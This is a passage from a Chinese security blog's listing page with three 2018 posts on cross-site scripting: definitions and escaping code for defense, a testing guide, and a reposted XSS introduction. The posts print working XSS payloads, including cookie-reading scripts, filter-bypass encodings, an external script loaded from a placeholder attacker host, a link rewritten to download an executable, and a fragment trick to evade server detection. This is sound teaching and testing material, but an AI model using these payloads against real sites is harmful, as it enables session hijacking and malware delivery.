                  </div>
                </div>
              </div><!-- article -->
        
			<div class="article">
                <a class="clearlink" href="15446890453437.html">
                
                  <h1>xss基础</h1>
                  <div class="a-content">
                      
                      <div class="a-content-text">
                        
                        	<blockquote>
<p>description: 这里包含了xss的基本定义，原理、及防御方案代码示例。</p>
</blockquote>

<h2 id="toc_0">简介</h2>

<p>跨站脚本XSS是一种注入类型攻击，攻击者注入恶意代码到web应用程序并发送给不同的最终用户时，就会发生xss攻击，并且可能发生在web应用程序<u>在其生成的输出中使用来之用户的输入</u>并且无需验证或编码它的任何地方。</p>

<p>跨站脚本发生在：</p>

<ul>
<li>任何可以插入数据，并且数据包会未经恶意内容验证就发送给Web用户的地方。</li>
</ul>

<p>跨站脚本分为两类：</p>

<ul>
<li>反射型(又称非持久性xss): 反射性xss通常出现在错误消息、搜索结果、或者服务器实时响应部分或全部请求的地方。可以通过电子邮件、恶意链接、等途径进行攻击。</li>
<li>存储型(又称持久性xss): 存储型xss通常将恶意代码永久存储在目标服务器上，如数据库、消息论坛、访问日志、注释字段等。</li>
<li>DOM型: dom型xss我觉得也属于存储型，只不过是存储在客户端。有效载荷修改了客户端浏览器中的DOM环境并执行恶意代码，也就是说HTTP响应是不变的，恶意代码被存储在客户端响应页面中。因此很难在服务器端做安全检测。</li>
</ul>

<h2 id="toc_1">危害</h2>

<p>xss可以窃取用户的会话cookie，允许攻击者劫持用户的会话并接管账号，其他攻击包括最终用户文件的泄露、木马程序安装、将用户重定向到其他页面或站点、修改内容的呈现等。</p>

<p>具体危害如：允许攻击者修改新闻稿或新闻项目的XSS漏洞可能会影响公司的股价或降低消费者信心。制药网站上的XSS漏洞可能允许攻击者修改剂量信息，从而导致过量服用。</p>

<h2 id="toc_2">防御</h2>

<p>1、在<strong>输出时</strong>将不可信数据（用户可控的数据：包括主体、属性、JavaScript、CSS或URL）使用 htmlEscape（）进行转义；将html、js中涉及到的关键字符进行html编码处理后再输出到页面上。</p>

<p>2、如果存在用户需要编写文章等功能的时候，类似用户可以自定义页面样式的功能，则需要限制用户的输入，采用严格的<strong>白名单</strong>机制来过滤用户的输入，即非用户允许的功能标签都应该被完全过滤，这种过滤应依赖于后端应用来实现。</p>

<p>3、应注意很多开源的第三方富文本编辑器，部分编辑器仅在JS端进行过滤，而不在后端进行关键字过滤。</p>

<h3 id="toc_3">代码示例</h3>

<p>1.Java<br/>
<strong>Portal 或 Spring 框架修复方案：</strong></p>

<pre class="line-numbers"><code class="language-java">import org.springframework.web.util.HtmlUtils;
target = HtmlUtils.htmlEscape(target);
</code></pre>

<p>// target 参数为需要进行转义的参数，建议在该参数输出前进行转义</p>

<p><strong>通用型修复方案</strong>：</p>

<pre class="line-numbers"><code class="language-java">StringEscapeUtils from Apache Commons Lang:

import static org.apache.commons.lang.StringEscapeUtils.escapeHtml;
// ...
String source = &quot;The less than sign (&lt;) and ampersand (&amp;) must be escaped before using them in HTML&quot;;
String escaped = escapeHtml(source);


For version 3:

import static org.apache.commons.lang3.StringEscapeUtils.escapeHtml4;
// ...
String escaped = escapeHtml4(source);
</code></pre>

<p>2.<strong>PHP</strong><br/>
htmlspecialchars() 在输出时使用该函数转义用户输入的值，尤其注意第二个 flag 参数要使用 ENT_QUOTES</p>

<pre class="line-numbers"><code class="language-php">&lt;?php 
    $name = $_GET[&quot;name&quot;];
    $name = htmlspecialchars($name, ENT_QUOTES);
?&gt;
</code></pre>

<p>htmlentities() 在输出时使用该函数转义用户输入的值</p>

<p>针对富文本，使用以下过滤类进行处理：</p>

<pre class="line-numbers"><code class="language-php">&lt;?php
/**
 * PHP 富文本XSS过滤类
 *
 * @package XssHtml
 * @version 1.0.0 
 * @link http://phith0n.github.io/XssHtml
 * @since 20140621
 * @copyright (c) Phithon All Rights Reserved
 *
 */

#
# Usage: 
# &lt;?php
# require(&#39;Xss.php&#39;);
# $html = &#39;&lt;html code&gt;&#39;;
# $xss = new XssHtml($html);
# $html = $xss-&gt;getHtml();
# ?\&gt;
# 
# 需求：
# PHP Version &gt; 5.0
# 浏览器版本：IE7+ 或其他浏览器，无法防御IE6及以下版本浏览器中的XSS
# 更多使用选项见 http://phith0n.github.io/XssHtml

class Xss {
    private $m_dom;
    private $m_xss;
    private $m_ok;
    private $m_AllowAttr = array(&#39;title&#39;, &#39;src&#39;, &#39;href&#39;, &#39;id&#39;, &#39;class&#39;, &#39;style&#39;, &#39;width&#39;, &#39;height&#39;, &#39;alt&#39;, &#39;target&#39;, &#39;align&#39;);
    private $m_AllowTag = array(&#39;img&#39;, &#39;br&#39;, &#39;strong&#39;, &#39;b&#39;, &#39;code&#39;, &#39;p&#39;, &#39;div&#39;, &#39;em&#39;, &#39;span&#39;, &#39;h1&#39;, &#39;h2&#39;, &#39;h3&#39;, &#39;h4&#39;, &#39;h5&#39;, &#39;h6&#39;, &#39;table&#39;, &#39;ul&#39;, &#39;ol&#39;, &#39;tr&#39;, &#39;th&#39;, &#39;td&#39;, &#39;hr&#39;, &#39;li&#39;, &#39;u&#39;);

    /**
     * 构造函数
     *
     * @param string $html 待过滤的文本
     * @param string $charset 文本编码，默认utf-8
     * @param array $AllowTag 允许的标签，如果不清楚请保持默认，默认已涵盖大部分功能，不要增加危险标签
     */
    public function __construct($html, $charset = &#39;utf-8&#39;, $AllowTag = array()){
        $this-&gt;m_AllowTag = empty($AllowTag) ? $this-&gt;m_AllowTag : $AllowTag;
        $this-&gt;m_xss = strip_tags($html, &#39;&lt;&#39; . implode(&#39;&gt;&lt;&#39;, $this-&gt;m_AllowTag) . &#39;&gt;&#39;);
        if (empty($this-&gt;m_xss)) {
            $this-&gt;m_ok = FALSE;
            return ;
        }
        $this-&gt;m_xss = &quot;&lt;meta http-equiv=\&quot;Content-Type\&quot; content=\&quot;text/html;charset={$charset}\&quot;&gt;&lt;nouse&gt;&quot; . $this-&gt;m_xss . &quot;&lt;/nouse&gt;&quot;;
        $this-&gt;m_dom = new DOMDocument();
        $this-&gt;m_dom-&gt;strictErrorChecking = FALSE;
        $this-&gt;m_ok = @$this-&gt;m_dom-&gt;loadHTML($this-&gt;m_xss);
    }

    /**
     * 获得过滤后的内容
     */
    public  function getHtml()
    {
        if (!$this-&gt;m_ok) {
            return &#39;&#39;;
        }
        $nodeList = $this-&gt;m_dom-&gt;getElementsByTagName(&#39;*&#39;);
        for ($i = 0; $i &lt; $nodeList-&gt;length; $i++){
            $node = $nodeList-&gt;item($i);
            if (in_array($node-&gt;nodeName, $this-&gt;m_AllowTag)) {
                if (method_exists($this, &quot;__node_{$node-&gt;nodeName}&quot;)) {
                    call_user_func(array($this, &quot;__node_{$node-&gt;nodeName}&quot;), $node);
                }else{
                    call_user_func(array($this, &#39;__node_default&#39;), $node);
                }
            }
        }
        $html = strip_tags($this-&gt;m_dom-&gt;saveHTML(), &#39;&lt;&#39; . implode(&#39;&gt;&lt;&#39;, $this-&gt;m_AllowTag) . &#39;&gt;&#39;);
        $html = preg_replace(&#39;/^\n(.*)\n$/s&#39;, &#39;$1&#39;, $html);
        return $html;
    }

    private function __true_url($url){
        if (preg_match(&#39;#^https?://.+#is&#39;, $url)) {
            return $url;
        }else{
            return &#39;http://&#39; . $url;
        }
    }

    private function __get_style($node){
        if ($node-&gt;attributes-&gt;getNamedItem(&#39;style&#39;)) {
            $style = $node-&gt;attributes-&gt;getNamedItem(&#39;style&#39;)-&gt;nodeValue;
            $style = str_replace(&#39;\\&#39;, &#39; &#39;, $style);
            $style = str_replace(array(&#39;&amp;#&#39;, &#39;/*&#39;, &#39;*/&#39;), &#39; &#39;, $style);
            $style = preg_replace(&#39;#e.*x.*p.*r.*e.*s.*s.*i.*o.*n#Uis&#39;, &#39; &#39;, $style);
            return $style;
        }else{
            return &#39;&#39;;
        }
    }

    private function __get_link($node, $att){
        $link = $node-&gt;attributes-&gt;getNamedItem($att);
        if ($link) {
            return $this-&gt;__true_url($link-&gt;nodeValue);
        }else{
            return &#39;&#39;;
        }
    }

    private function __setAttr($dom, $attr, $val){
        if (!empty($val)) {
            $dom-&gt;setAttribute($attr, $val);
        }
    }

    private function __set_default_attr($node, $attr, $default = &#39;&#39;)
    {
        $o = $node-&gt;attributes-&gt;getNamedItem($attr);
        if ($o) {
            $this-&gt;__setAttr($node, $attr, $o-&gt;nodeValue);
        }else{
            $this-&gt;__setAttr($node, $attr, $default);
        }
    }

    private function __common_attr($node)
    {
        $list = array();
        foreach ($node-&gt;attributes as $attr) {
            if (!in_array($attr-&gt;nodeName, 
                $this-&gt;m_AllowAttr)) {
                $list[] = $attr-&gt;nodeName;
            }
        }
        foreach ($list as $attr) {
            $node-&gt;removeAttribute($attr);
        }
        $style = $this-&gt;__get_style($node);
        $this-&gt;__setAttr($node, &#39;style&#39;, $style);
        $this-&gt;__set_default_attr($node, &#39;title&#39;);
        $this-&gt;__set_default_attr($node, &#39;id&#39;);
        $this-&gt;__set_default_attr($node, &#39;class&#39;);
    }

    private function __node_img($node){
        $this-&gt;__common_attr($node);

        $this-&gt;__set_default_attr($node, &#39;src&#39;);
        $this-&gt;__set_default_attr($node, &#39;width&#39;);
        $this-&gt;__set_default_attr($node, &#39;height&#39;);
        $this-&gt;__set_default_attr($node, &#39;alt&#39;);
        $this-&gt;__set_default_attr($node, &#39;align&#39;);

    }

    private function __node_a($node){
        $this-&gt;__common_attr($node);
        $href = $this-&gt;__get_link($node, &#39;href&#39;);

        $this-&gt;__setAttr($node, &#39;href&#39;, $href);
        $this-&gt;__set_default_attr($node, &#39;target&#39;, &#39;_blank&#39;);
    }

    private function __node_embed($node){
        $this-&gt;__common_attr($node);
        $link = $this-&gt;__get_link($node, &#39;src&#39;);

        $this-&gt;__setAttr($node, &#39;src&#39;, $link);
        $this-&gt;__setAttr($node, &#39;allowscriptaccess&#39;, &#39;never&#39;);
        $this-&gt;__set_default_attr($node, &#39;width&#39;);
        $this-&gt;__set_default_attr($node, &#39;height&#39;);
    }

    private function __node_default($node){
        $this-&gt;__common_attr($node);
    }
}

?&gt;
</code></pre>

                        
                      </div>
                  </div>
                </a>
                <div class="read-more clearfix">
                  <div class="more-left left">
                  
                    <span class="date">2018/12/13 16:17 下午</span>
                    <span>posted in&nbsp;</span> 
          				  
          					    <span class="posted-in"><a href='xss%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC.html'>xss跨站脚本</a></span>
          				   
                  </div>
                  <div class="more-right right">
                  <span class="comments">
                      

                       
                  </span>
                  </div>
                </div>
              </div><!-- article -->
        
			<div class="article">
                <a class="clearlink" href="15446888524769.html">
                
                  <h1>xss检测</h1>
                  <div class="a-content">
                      
                      <div class="a-content-text">
                        
                        	<h2 id="toc_0">反射型xss</h2>

<p>1、检测输入向量，确定所有web应用程序的用户定义变量以及如何输入他们，包括显而易见的、http参数、post数据、隐藏的表单字段值等。</p>

<p>2、分析每个输入向量并注入payload以检测潜在的漏洞。</p>

<p>3、分析结果并确定是否存在具有实际影响的漏洞。</p>

<ul>
<li><p>没有任何防御的情况下</p>
<p>直接访问即会弹窗</p>
<pre class="line-numbers"><code class="language-http">http://example.com/index.php?user=&lt;script&gt;alert(123)&lt;/script&gt;
</code></pre>
<p>下面这段代码会导致用户单击测试人员提供的链接，即葱他控制的站点下载文件test.exe。</p>
<pre class="line-numbers"><code class="language-http">http://example.com/index.php?user=&lt;script&gt;window.onload = function() {var AllLinks=document.getElementsByTagName(&quot;a&quot;); 
AllLinks[0].href = &quot;http://badexample.com/test.exe&quot;; }&lt;/script&gt; 
</code></pre></li>
<li><p>标记属性值</p>
<p>有些情况下可以不使用<code>&lt;script&gt;</code>标签的情况下执行xss漏洞利用，甚至不使用通常过滤的 &lt;&gt; 和 / 等字符。</p>
<p>例如，Web应用程序可以使用用户输入值来填充属性，如以下代码所示：</p>
<pre class="line-numbers"><code class="language-javascript">&lt;input type=&quot;text&quot; name=&quot;state&quot; value=&quot;INPUT_FROM_USER&quot;&gt;
</code></pre>
<p>然后攻击者可以提交以下代码：</p>
<pre class="line-numbers"><code class="language-javascript">&quot; onfocus=&quot;alert(document.cookie)
</code></pre></li>
<li><p>不同的语法或编码</p>
<p>通常可以使用这种方法来绕过一些过滤器</p>
<p>代码示例：</p></li>
</ul>

<pre class="line-numbers"><code class="language-javascript">  &quot;&gt;&lt;script &gt;alert(document.cookie)&lt;/script &gt;
  &quot;&gt;&lt;ScRiPt&gt;alert(document.cookie)&lt;/ScRiPt&gt;
  &quot;%3cscript%3ealert(document.cookie)%3c/script%3e
</code></pre>

<ul>
<li><p>绕过非递归过滤器</p>
<p>有时，过滤器只清理一次，而不是递归执行</p>
<pre class="line-numbers"><code class="language-javascript">&lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/script&gt;
</code></pre></li>
<li><p>包含外部脚本</p>
<p>现在假设目标站点的开发人员实现了以下代码来保护输入不包含外部脚本：</p></li>
</ul>

<pre class="line-numbers"><code class="language-text">&lt;?
   $re = &quot;/&lt;script[^&gt;]+src/i&quot;;

   if (preg_match($re, $_GET[&#39;var&#39;])) 
   {
      echo &quot;Filtered&quot;;
      return; 
   }
   echo &quot;Welcome &quot;.$_GET[&#39;var&#39;].&quot; !&quot;;
?&gt;
</code></pre>

<p>这种方案中，有一个正则表达式检测是否在 <code>&lt;script</code> 和 <code>&gt;</code> 之间插入了除 src 之外的任何其他内容。这对</p>

<pre class="line-numbers"><code class="language-javascript">&lt;script src=&quot;http://attacker/xss.js&quot;&gt;&lt;/script&gt;
</code></pre>

<p>这种表达式特别有效。</p>

<p>但是可以使用以下方式绕过：</p>

<pre class="line-numbers"><code class="language-javascript">http://example/?var=&lt;SCRIPT%20a=&quot;&gt;&quot;%20SRC=&quot;http://attacker/xss.js&quot;&gt;&lt;/SCRIPT&gt; 
</code></pre>

<ul>
<li>HTTP参数污染(HPP)</li>
</ul>

<p>这种规避技术包括在具有相同名称的多个参数之间拆分攻击向量。对每个参数值的操纵取决于每个web技术如何解析这些参数，因此这种规避不是总是可行的。</p>

<p>定向攻击代码：</p>

<pre class="line-numbers"><code class="language-javascript">http://example/page.php?param=&lt;script&gt;[...]&lt;/script&gt;
</code></pre>

<p>使用HPP攻击：</p>

<pre class="line-numbers"><code class="language-javascript">http://example/page.php?param=&lt;script&amp;param=&gt;[...]&lt;/&amp;param=script&gt;
</code></pre>

<ul>
<li>通常使用burp的主动扫描，即可检测出大部分情况下的反射型xss，而存储型xss目前还没有比较好的检测方法。</li>
</ul>

<h2 id="toc_1">存储型xss</h2>

<ul>
<li><p>输入表格</p></li>
<li><p>存储型xss能不能成功主要取决于能不能规避过滤器。</p></li>
<li><p>上传文件</p>
<p>如果web应用程序允许文件上传，那么检查是否可以上载html内容就很重要。如果允许html或者txt文件，则可以在上载的文件中注入xss有效载荷。还应该验证文件上载是否允许设置任意MIME类型。</p>
<p>考虑以下用于文件上传的 HTTP POST 请求：</p>
<pre class="line-numbers"><code class="language-http">POST /fileupload.aspx HTTP/1.1
[…]<br/>
Content-Disposition: form-data; name=&quot;uploadfile1&quot;; filename=&quot;C:\Documents and Settings\test\Desktop\test.txt&quot;<br/>
Content-Type: text/plain<br/>
test
</code></pre>
<p>这种设计缺陷可以在浏览器 MIME 错误处理攻击中利用。例如，像jpg、gif这样的文件可以包含在浏览器加载时执行xss的有效载荷。当images、gif这样的图像的MIME类型可以设置为text/html时，这是可能的。这种情况下，客户端浏览器将文件视为HTML。</p>
<p>HTTP POST 请求伪造:</p>
<pre class="line-numbers"><code class="language-http">Content-Disposition: form-data; name=&quot;uploadfile1&quot;; filename=&quot;C:\Documents and Settings\test\Desktop\test.gif&quot;
Content-Type: text/html<br/>
&lt;script&gt;alert(document.cookie)&lt;/script&gt;
</code></pre></li>
<li><p>测试应用程序如何处理用户输入</p>
<p>可以执行以下步骤:</p>
<ul>
<li>使用前端应用程序并输入带有特殊/无效字符的输入</li>
<li>分析应用程序响应</li>
<li>确定输入验证控件存在</li>
<li>访问后端系统并检查输入是否存储以及如何存储</li>
<li>分析源代码并了解应用程序如何呈现存储的输入</li>
</ul></li>
<li><p>如果源码可用，则应分析输入表单中使用的所有变量，特别是PHP、ASP和JSP等编程语言使用预定义的变量/函数来存储来自HTTP GET和POST请求的输入。</p>
<p>下表总结了在分析源代码时要查看的一些特殊变量和函数：</p>
<table>
<thead>
<tr>
<th>语言</th>
<th>PHP</th>
<th>ASP</th>
<th>JSP</th>
</tr>
</thead>
<tbody>
<tr>
<td>变量函数</td>
<td>$_GET —— HTTP GET变量</td>
<td>Request.QueryString —— HTTP GET</td>
<td>doGet, doPost servlets —— HTTP GET 和 POST</td>
</tr>
<tr>
<td></td>
<td>$_POST—— HTTP POST变量</td>
<td>Request.Form ——  HTTP POST</td>
<td>request.getParameter —— HTTP GET/POST 变量</td>
</tr>
<tr>
<td></td>
<td>$_REQUEST —— HTTP POST, GET 和 COOKIE变量</td>
<td>Server.CreateObject —— 用来上传文件</td>
<td></td>
</tr>
<tr>
<td></td>
<td>$_FILES —— HTTP文件上传变量</td>
<td></td>
<td></td>
</tr>
</tbody>
</table></li>
</ul>

<h2 id="toc_2">DOM型xss</h2>

<ul>
<li>举个例子：</li>
</ul>

<p>假如我们访问一个页面: <code>http://www.example.com/welcome.html</code></p>

<pre class="line-numbers"><code class="language-markup">&lt;HTML&gt;
&lt;TITLE&gt;Welcome!&lt;/TITLE&gt;
Hi
&lt;SCRIPT&gt;
var pos=document.URL.indexOf(&quot;name=&quot;)+5;
document.write(document.URL.substring(pos,document.URL.length));
&lt;/SCRIPT&gt;
&lt;BR&gt;
Welcome to our system
…
&lt;/HTML&gt;
</code></pre>

<p>此页面将用于欢迎用户，例如:</p>

<p><code>http://www.example.com/welcome.html?name=lonelyor</code></p>

<p>但是请求如下: </p>

<p><code>http://www.example.com/welcome.html?name=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>

<p>这样会触发dom型xss的条件。让我们看看为什么:</p>

<p>当受害者的浏览器像 <code>www.example.con</code> 发送http请求，并接受上述(静态)html页面。然后受害者的浏览器会开始将html解析为dom，dom包含一个名为 document 的对象，该对象包含一个名为 URL 的属性，并且此属性使用当前页面的 URL 填充来作为 dom 创建的一部分。当解析器达到javascript代码时，它会执行</p>

<pre class="line-numbers"><code class="language-javascript">var pos=document.URL.indexOf(&quot;name=&quot;)+5;
document.write(document.URL.substring(pos,document.URL.length));
</code></pre>

<p>并修改页面的原始html。这种情况下，代码引用 document.URL，因此，此name字符串的一部分将嵌入在html中并立即解析，这时会在同一页面执行 <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>，因此是xss条件。</p>

<ul>
<li><p>注意</p>
<ul>
<li>恶意代码在任何时候都没有嵌入到原始html页面中(这与反射和存储型不同)</li>
<li>此漏洞仅在浏览器不修改url字符时才有效。当url不直接在地址栏中输入时，火狐会自动编码 document.url 中的 &lt;和&gt;(分别为 %3C 和 %3E )，因此火狐不易收到攻击。IE6.0因为不编码这些所以容易被攻击。当然，直接嵌入HTML只是一个攻击挂载点，有各种场景不需要&lt;和&gt;，因此Mozilla通常不能免受此攻击。</li>
</ul></li>
<li><p>规避服务器检测</p>
<p>显然上面的方法还是把payload发送到了服务器，这样后端还是可以检测到，不过，我们可以规避这种检测。</p>
<p>新的payload如下:</p>
<p><code>http://www.example.com/welcome.html#name=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
<p>注意文件后面的数学符号(#)，他告诉浏览器，#后面的内容都是片段，即不是查询的一部分，火狐和IE6.0不会将片段发送到服务器，因此服务器将看到相当于<code>http://www.example.com/welcome.html</code>，所以服务器不会看到有效载荷。</p></li>
</ul>

<h2 id="toc_3">参考链接</h2>

<p><a href="https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OTG-INPVAL-001)">反射性xss</a></p>

<p><a href="https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OTG-INPVAL-002)">存储型xss</a></p>

<p><a href="https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_(OTG-CLIENT-001)">dom型xss</a></p>

                        
                      </div>
                  </div>
                </a>
                <div class="read-more clearfix">
                  <div class="more-left left">
                  
                    <span class="date">2018/12/13 16:14 下午</span>
                    <span>posted in&nbsp;</span> 
          				  
          					    <span class="posted-in"><a href='xss%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC.html'>xss跨站脚本</a></span>
          				   
                  </div>
                  <div class="more-right right">
                  <span class="comments">
                      

                       
                  </span>
                  </div>
                </div>
              </div><!-- article -->
        
			<div class="article">
                <a class="clearlink" href="15446876559011.html">
                
                  <h1>xssing.org跨站的艺术</h1>
                  <div class="a-content">
                      
                      <div class="a-content-text">
                        
                        	<blockquote>
<p>这个网站太棒了，强烈推荐阅读<br/>
<a href="https://xssing.org/%E9%A6%96%E9%A1%B5">xssing.org跨站的艺术</a>若不能直接访问请使用科学上网工具。</p>
</blockquote>

<h1 id="toc_0">什么是XSS？</h1>

<h1 id="toc_1">概述</h1>

<p>XSS全称跨站脚本(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故缩写为XSS，比较合适的方式应该叫做跨站脚本攻击。跨站点脚本（XSS）攻击是一种注射型攻击，攻击者在可信的网页中嵌入恶意代码，用户访问可信网页时触发XSS而被攻击.</p>

<p>攻击者通过Web应用程序发送恶意代码，一般以浏览器脚本的形式发送给不同的终端用户。当一个Web程序的用户输入点没有进行校验和编码，将很容易的导致XSS。</p>

<p>攻击者可以使用XSS发送恶意脚本给没有任何防备的用户。终端用户浏览器无法知道不应该信任叫嗯,而是执行了该脚本。因为它认为脚本来自可信的源,恶意脚本可以访问任何Cookies,会话令牌,或其浏览器和网站保留使用的他敏感信息。这些脚本甚至可以重写HTML页面的内容。更多的内容可以阅读本站其他内容。</p>

<h1 id="toc_2">详细介绍</h1>

<p>跨站脚本攻击在以下情况出现:</p>

<ol>
<li>Web应用程序通过不可信的来源进行数据输入，最常见是的Web请求(输入，比如如GET访问某Web应用的url，通过参数提交数据,比如提交input=<script>alert(0);&lt;/ script&gt;)。</li>
<li>恶意数据包含在动态内容内在没有进行校验的情况下发送给用户(输出，比如提交的input的值在没有校验的情况下，用户访问页面，浏览器直接渲染了input的值执行了JS，导致弹窗)。</li>
</ol>

<p>发送到Web浏览器的恶意内容通常是以JavaScript代码的形式，当然也可以包括HTML，Flash或任何浏览器可以执行的其他类型的代码。基于XSS的攻击种类几乎是无限的，但它们通常包括发送隐私数据给攻击者，如cookies或其他会话信息；重定向受害者访问攻击者控制的页面；或者利用网站漏洞在用户机器上执行其他恶意操作。</p>

<h2 id="toc_3">存储型和反射型XSS攻击</h2>

<p>XSS攻击通常可以分为两类：存储型和反射型（也称持久性和非持久性）。还有第三种相对少为认知的XSS攻击类型，叫做DOM XSS ,具体可以点击这里阅读。</p>

<p>同时最近还有一种XSS攻击类型被提出来，突变XSS，不过个人觉得突变XSS不合适作为第四种XSS攻击类型，因为这种突变XSS可以出现在以上三种类型的XSS里，不过比较特殊，我们同样也在这里进行单独介绍（Fooying注）。</p>

<h2 id="toc_4">存储型XSS攻击</h2>

<p>存储型攻击是指那些被注入脚本将被永久保存在目标服务器上，比如在数据库中，在消息板块，访客日志，注释字段等。受害人请求存储信息时，将再次检索到恶意脚本(比如，在留言板提交XSS攻击代码，会存储到数据库，当再次访问留言板会请求数据库中的留言信息，就会连同XSS攻击代码一起检索出来在页面展示，使得受害者再次被攻击)。存储型XSS有时也被称为持久性或Type-I XSS。</p>

<h2 id="toc_5">反射型XSS攻击</h2>

<p>反射型攻击是指那些被注入脚本反射出Web服务器，比如在一个错误信息、搜索结果，或者其他任何的包括一些或所有的输入作为请求的一部分发送到服务器的响应。反射型攻击是通过其他途径送达到受害者，比如一封邮件的内容，或者一些其他的网站。当用户被诱骗点击一个恶意链接，提交一个特制的表单，甚至只是浏览到恶意网站，被注入的脚本行进到有漏洞的网站，将攻击反射回用户浏览器。然后浏览器执行代码，因为它来自于一个“可信”的服务器。反射型XSS有时也被称为非持久性或Type-II XSS.</p>

<h2 id="toc_6">其他类型的XSS漏洞的</h2>

<p>除了反射型和存储型XSS,其他类型的XSS，Amit Klein在2005年发现DOM XSS。除此之外，推荐关于XSS分类描述的文章：XSS分类，它涵盖了所有这些方面的XSS，组成了矩阵，存储vs反射型XSS，以及服务端和客户端XSS，DOM XSS是客户端XSS。</p>

<h2 id="toc_7">XSS攻击结果</h2>

<p>无论是存储型还是反射型（或DOM XSS）的攻击结果都是相同的。不同的是Payload如何有效的到达服务器。不要错误的认为，一个“read only”或“brochureware”网站不容易受到严重的反射型XSS攻击。XSS可以引起终端用户的各种问题，包括不同的严重成都。最严重的XSS攻击涉及用户的会话cookie的披露，使攻击者劫持用户的会话和接管帐户。其他破坏性攻击包括终端用户的文件披露，特洛伊木马程序的安装，将用户重定向到其他网页或网站，或修改内容介绍。XSS漏洞允许攻击者修改新闻稿或新闻项目可以影响一个公司的股票价格或减少消费者的信心。一个药品网站XSS漏洞可能允许攻击者修改剂量信息导致过量。更多关于这些类型的攻击请看内容欺骗。</p>

<h2 id="toc_8">如何确定存在漏洞</h2>

<p>XSS漏洞比较难以识别和从Web应用程序中删除。发现漏洞的最佳方法是进行的代码的安全审计，搜索一个HTTP请求中可能进入HTML输出的所有输入点。值得注意的是，各种不同的HTML标签可以用来发送一个恶意的JavaScript。Nessus, Nikto以及其他的一些扫描器，可以用来扫描检测XSS，不过效果有限。如果一个网站的某部分存在漏洞，那么很有可能还有其他的问题。</p>

<h2 id="toc_9">如何防范XSS</h2>

<p>XSS防御的相关内容位于OWASP XSS防范备忘录 .</p>

<p>另外，最主要的是关闭掉你所有Web服务对HTTP回调的支持。攻击者可以窃取cookie数据通过JavaScript，即使document.cookie被禁用或不支持客户端。用户可以在论坛发布一个恶意脚本，当其他人点击链接，异步回调请求就会被触发，用来收集来自服务器的用户的cookie信息，然后发送到另一个接收地址，这样攻击者就可以进行一个会话劫持攻击。关闭掉你所有Web服务对HTTP回调的支持是很容易的。</p>

<p>OWASP ESAPI project已经开发了一套可重用的安全组件。包含多种编程语言，包括验证和转义来防止参数篡改和XSS攻击注射。此外，OWASP WebGoat Project训练应用，有跨站点脚本和数据编码的训练经验。</p>

<h2 id="toc_10">XSS语句</h2>

<p><strong>属性中使用脚本的XSS</strong><br/>
XSS攻击可能在非<script></script> 标签中发生. 其他标签也可以做同样事，比如:</p>

<p><code>&lt;body onload=alert(&#39;test1&#39;)&gt;</code><br/>
或其他属性，如:onmouseover,onerror.onmouseover</p>

<p><code>&lt;b onmouseover=alert(&#39;Wufff!&#39;)&gt;click me!&lt;/b&gt;</code><br/>
onerror</p>

<p><code>&lt;img src=&quot;http://url.to.file.which/not.exist&quot; onerror=alert(document.cookie);&gt;</code></p>

<p><strong>利用XSS脚本通过编码的URI方案</strong><br/>
如果我们需要绕过Web应用过滤器，我们可以尝试编码字符串，比如：a=A (UTF-8),在img标签中使用：</p>

<p><code>&lt;IMG SRC=jAvascript:alert(&#39;test2&#39;)&gt;</code><br/>
有许多不同的UTF-8编码符号可以给我们更多的可能性。</p>

<p><strong>XSS利用代码的编码</strong><br/>
在META标签，我们可以对我们的脚本进行base64编码，这样就不用输入alert()字符。这个方法的更多信息参考RFC 2397</p>

<p><code>&lt;META HTTP-EQUIV=&quot;refresh&quot; <br/>
CONTENT=&quot;0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg&quot;&gt;</code></p>

<p>这些以及其他的例子可以在OWASP XSS Filter Evasion Cheat Sheet查看。这是一个真正的备用XSS攻击代码的百科</p>

<h1 id="toc_11">例子</h1>

<p>跨站点脚本攻击可能发生在任何地方，可能是恶意用户被允许发送非规范内容到一个可信的网站给其他合法用户。最常见的例子发生在网站公告板，提供基于Web的邮件列表的功能</p>

<h2 id="toc_12">例子 1</h2>

<p>The following JSP code segment reads an employee ID, eid, from an HTTP request and displays it to the user. 下面的JSP代码块从一个HTTP请求读取employee ID, eid，并展示给用户。</p>

<pre class="line-numbers"><code class="language-text">    &lt;% String eid = request.getParameter(&quot;eid&quot;); %&gt; 
    ... 
    Employee ID: &lt;%= eid %&gt;
</code></pre>

<p>如果eid仅包含标准字母数字文本，则此示例中的代码可正常运行。如果eid具有包含元字符或源代码的值，则代码将在Web浏览器显示HTTP响应时执行。</p>

<p>最初，这似乎不是一个漏洞。毕竟，为什么有人会输入导致恶意代码在自己的计算机上运行的URL？真正的危险是攻击者会创建恶意URL，然后使用电子邮件或社交工程技巧诱使受害者访问URL的链接。当受害者点击该链接时，他们会无意中通过易受攻击的Web应用程序将恶意内容反映回自己的计算机。这种利用易受攻击的Web应用程序的机制称为反射型XSS。</p>

<h2 id="toc_13">例子 2</h2>

<p>The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee&#39;s name.</p>

<pre class="line-numbers"><code class="language-jsp">    &lt;%...
     Statement stmt = conn.createStatement(); 
     ResultSet rs = stmt.executeQuery(&quot;select * from emp where id=&quot;+eid); 
     if (rs != null) { 
      rs.next(); 
      String name = rs.getString(&quot;name&quot;); 
    %&gt; 
    Employee Name: &lt;%= name %&gt;
```

以上，是首页的部分内容，首页还有很多的参考链接，这些链接都非常有价值，可是不好copy，所以请读者自行前往原网站欣赏。
</code></pre>

                        
                      </div>
                  </div>
                </a>
                <div class="read-more clearfix">
                  <div class="more-left left">
                  
                    <span class="date">2018/12/13 15:54 下午</span>
                    <span>posted in&nbsp;</span> 
          				  
          					    <span class="posted-in"><a href='xss%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC.html'>xss跨站脚本</a></span>
          				   
                  </div>
                  <div class="more-right right">
                  <span class="comments">
                      

                       
                  </span>
                  </div>
                </div>
